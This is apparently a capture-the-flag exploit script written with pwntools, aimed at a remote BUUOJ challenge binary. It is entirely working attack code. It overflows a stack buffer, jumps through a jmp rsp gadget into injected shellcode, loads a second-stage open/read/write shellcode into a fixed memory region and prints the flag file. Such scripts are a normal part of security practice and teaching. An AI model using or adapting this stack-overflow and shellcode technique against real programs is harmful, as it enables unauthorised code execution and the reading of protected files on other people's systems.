from pwn import *
context.arch="amd64"

#sh=process("./timu")
sh=remote("node5.buuoj.cn",29102)
elf=ELF("./timu")

jmp_rsp=0x0000000000400a01
mmap=0x123000

orw=shellcraft.open("./flag")
orw+=shellcraft.read(3,mmap+0x100,0x50)
orw+=shellcraft.write(1,mmap+0x100,0x50)

payload=asm(shellcraft.read(0,mmap,0x100))+asm("mov rax,0x123000;call rax")

payload=payload.ljust(0x28,b'a')
payload+=p64(jmp_rsp)+asm("sub rsp,0x30;jmp rsp")

sh.sendline(payload)
sh.send(asm(orw))

sh.interactive()
